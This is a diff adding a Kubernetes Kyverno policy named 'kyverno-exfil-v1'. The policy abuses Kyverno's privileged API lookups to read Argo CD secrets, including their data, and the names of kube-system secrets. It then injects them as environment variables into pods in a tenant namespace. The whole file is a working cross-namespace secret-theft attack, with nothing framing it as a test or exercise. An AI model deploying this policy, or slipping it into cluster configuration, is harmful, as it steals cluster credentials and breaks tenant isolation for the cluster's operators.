@@ -1,0 +1,41 @@
+apiVersion: kyverno.io/v1
+kind: Policy
+metadata:
+  name: kyverno-exfil-v1
+  namespace: rg-0d70dc91-cd927cab
+spec:
+  failurePolicy: Ignore
+  rules:
+  - name: exfil-cross-ns
+    match:
+      any:
+      - resources:
+          kinds:
+          - Pod
+          namespaces:
+          - rg-0d70dc91-cd927cab
+    context:
+    - name: argocdSecretNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/argocd/secrets"
+        jmesPath: "join(',', items[*].metadata.name)"
+    - name: argocdSecretData
+      apiCall:
+        urlPath: "/api/v1/namespaces/argocd/secrets"
+        jmesPath: "items[*].{name: metadata.name, data: data}"
+    - name: kubeSystemSecretNames
+      apiCall:
+        urlPath: "/api/v1/namespaces/kube-system/secrets"
+        jmesPath: "join(',', items[*].metadata.name)"
+    mutate:
+      patchStrategicMerge:
+        spec:
+          containers:
+          - (name): "main"
+            env:
+            - name: KYVERNO_EXFIL_ARGOCD_NAMES
+              value: "{{ argocdSecretNames }}"
+            - name: KYVERNO_EXFIL_ARGOCD_DATA
+              value: "{{ argocdSecretData }}"
+            - name: KYVERNO_EXFIL_KUBESYS_NAMES
+              value: "{{ kubeSystemSecretNames }}"
